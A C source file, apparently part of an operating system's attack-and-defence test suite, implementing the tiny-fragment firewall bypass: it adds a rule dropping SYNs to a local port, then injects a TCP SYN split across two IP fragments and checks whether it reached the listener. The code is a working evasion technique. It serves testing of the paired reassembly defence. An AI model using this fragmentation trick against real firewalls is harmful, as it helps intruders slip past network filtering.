/*
 * atk_firewall_bypass_fragments.c - ATTACK firewall_bypass_fragments: sneak a SYN past the firewall in two fragments
 *
 * Breaks:     trust - a firewall rule sees every packet it is meant to stop
 * Stopped by: reassemble_before_filter (defence/reassemble_before_filter)
 *
 * A rule "drop SYNs to port 7791" needs the TCP flags, at byte 13 of
 * the TCP header. Split the SYN so the first fragment ends at byte 8: it
 * shows the ports but no flags, the second shows flags but no ports. A
 * filter that looks at fragments one by one passes both (RFC 1858's
 * tiny fragment attack).
 *
 * launch():  listen on 7791, add "iptables -A INPUT -p tcp --dport 7791
 *            --syn -j DROP", inject the SYN in 2 fragments.
 *            findings = 1 if the SYN reached the listener.
 * cleanup(): remove the rule, close the listener.
 *
 * Uses: firewall_* (core/firewall), socket_* (core/socket), netdev_inject (core/netdev), ui_*.
 */

#include "modules/security_management/core/registry/registry.h"                 // attack_t, registry_add_attack
#include "modules/network_management/security/firewall_bypass_fragments/defence/reassemble_before_filter/def_reassemble_before_filter.h" // def_filter_whole
#include "modules/network_management/core/netdev/netdev.h"                      // netdev_by_name, netdev_inject, netdev_lock
#include "modules/network_management/core/ethernet/ethernet.h"                  // eth_header_t, ETH_*
#include "modules/network_management/core/ipv4/ipv4.h"                          // ipv4_header_t, ipv4_stats
#include "modules/network_management/core/icmp/icmp.h"                          // icmp_header_t, icmp_stats
#include "modules/network_management/core/inet/inet.h"                          // htons, inet_checksum, INET_ADDR
#include "lib/string/string.h"                                                  // memcpy, memset
#include "modules/network_management/core/tcp/tcp.h"                            // tcp_header_t, tcp_conn, TCP_SYN
#include "modules/network_management/core/socket/socket.h"                      // socket_*
#include "modules/network_management/core/firewall/firewall.h"                  // firewall_*
#include "modules/ui/core/style/ui.h"                                           // ui_printf, ui_color

// An IPv4 packet inside an Ethernet frame for 'dev', as a machine on the
// link would send it: 'opt' (opt_len bytes of options), then 'data'.
// Returns the frame's length.
static int build_ip(uint8_t *f, const netdev_t *dev, uint32_t src, uint32_t dst, uint8_t proto,
                    uint16_t id, uint16_t frag, const uint8_t *opt, int opt_len, const void *data, int len) {
    static const uint8_t neighbour[6] = { 0x02, 0x00, 0x00, 0xaa, 0xbb, 0xcc };
    int hlen = IPV4_HLEN + opt_len;
    memset(f, 0, ETH_ZLEN);
    eth_header_t *eth = (eth_header_t *)f;
    memcpy(eth->dest, dev->mac, 6);
    memcpy(eth->src, neighbour, 6);
    eth->type = htons(ETH_P_IP);
    ipv4_header_t *ip = (ipv4_header_t *)(f + ETH_HLEN);
    ip->version_ihl = (uint8_t)(0x40 | (hlen / 4));
    ip->total_length = htons((uint16_t)(hlen + len));
    ip->id = htons(id);
    ip->frag = htons(frag);
    ip->ttl = 64;
    ip->protocol = proto;
    ip->src = htonl(src);
    ip->dst = htonl(dst);
    if (opt_len)
        memcpy(f + ETH_HLEN + IPV4_HLEN, opt, opt_len);
    ip->checksum = inet_checksum(ip, hlen);
    memcpy(f + ETH_HLEN + hlen, data, len);
    return ETH_HLEN + hlen + len < ETH_ZLEN ? ETH_ZLEN : ETH_HLEN + hlen + len;
}

// A bare TCP header (no options, no data) with its checksum.
static int build_tcp(uint8_t *out, uint32_t src, uint32_t dst, uint16_t sport, uint16_t dport,
                     uint32_t seq, uint32_t ack, uint8_t flags) {
    tcp_header_t *h = (tcp_header_t *)out;
    memset(out, 0, TCP_HLEN);
    h->src_port = htons(sport);
    h->dst_port = htons(dport);
    h->seq = htonl(seq);
    h->ack = htonl(ack);
    h->offset = (TCP_HLEN / 4) << 4;
    h->flags = flags;
    h->window = htons(8192);
    h->checksum = inet_checksum_pseudo(src, dst, IPPROTO_TCP, out, TCP_HLEN);
    return TCP_HLEN;
}

#define PORT 7791
static socket_t *listener;
static int rule_added;

static int simulate(void) {
    ui_printf("  the SYN flag is at byte 13 of the TCP header\n");
    ui_printf("  fragment 1: bytes 0-7 (ports, no flags); fragment 2: the rest\n");
    ui_printf("  a fragment-by-fragment filter sees no SYN in either one\n");
    return 1;
}

static int launch(void) {
    netdev_t *eth = netdev_by_name("eth0");
    if (!eth || !eth->ip) {
        ui_printf("  needs eth0 with an address (dhclient)\n");
        return 0;
    }
    static uint8_t f[ETH_ZLEN + 1600];

    sockaddr_t a;
    uint32_t len = sizeof(a);
    if (socket_create(AF_INET, SOCK_STREAM, 0, &listener) < 0)
        return 0;
    socket_inet_addr(&a, &len, 0, PORT);
    if (socket_bind(listener, &a, len) < 0 || socket_listen(listener, 4) < 0)
        return 0;
    fw_rule_t rule = { 0 };
    rule.chain = FW_INPUT;
    rule.protocol = IPPROTO_TCP;
    rule.dport = PORT;
    rule.syn_only = 1;
    rule.target = FW_DROP;
    rule_added = firewall_append(&rule) == 0;
    uint32_t src = INET_ADDR(10, 0, 2, 88);
    uint8_t syn[TCP_HLEN];
    build_tcp(syn, src, eth->ip, 43000, PORT, 9000, 0, TCP_SYN);
    netdev_inject(eth, f, (uint16_t)build_ip(f, eth, src, eth->ip, IPPROTO_TCP, 0x0F0F, IPV4_FLAG_MF, 0, 0, syn, 8));
    netdev_inject(eth, f, (uint16_t)build_ip(f, eth, src, eth->ip, IPPROTO_TCP, 0x0F0F, 1, 0, 0, syn + 8, TCP_HLEN - 8));
    int through = 0;
    for (int i = 0; i < TCP_MAX_CONNS; i++) {
        const tcp_conn_t *c = tcp_conn(i);
        through += c && c->local_port == PORT && c->remote_ip == src;
    }
    ui_printf("  rule: drop SYNs to %d; the SYN came in 2 fragments -> %s\n", PORT, through ? "REACHED the listener" : "dropped");
    ui_color(through ? UI_BAD : UI_GOOD);
    ui_printf("  %s\n", through ? "the firewall was bypassed" : "the firewall saw the whole SYN and dropped it");
    ui_reset();
    return through;
}

static int cleanup(void) {
    int done = 0;
    if (rule_added) {
        for (int n = 1; ; n++) {                // delete our rule: the one for this port
            int pos = 0, found = 0;
            for (int i = 0; i < FW_MAX_RULES; i++) {
                const fw_rule_t *r = firewall_rule(i);
                if (r->used && r->chain == FW_INPUT && ++pos && r->dport == PORT) {
                    found = pos;
                    break;
                }
            }
            if (!found || n > FW_MAX_RULES)
                break;
            firewall_delete(FW_INPUT, found);
            done++;
        }
        rule_added = 0;
    }
    if (listener) {
        socket_close(listener);
        listener = 0;
        done++;
    }
    return done;
}

static const attack_t attack = {
    "firewall_bypass_fragments",
    "split a SYN so that no single fragment shows the firewall the SYN flag",
    INV_TRUST, SEV_HIGH,
    simulate, launch, cleanup,
    "reassemble_before_filter"
};

void atk_firewall_bypass_fragments_register(void) { registry_add_attack(&attack); }
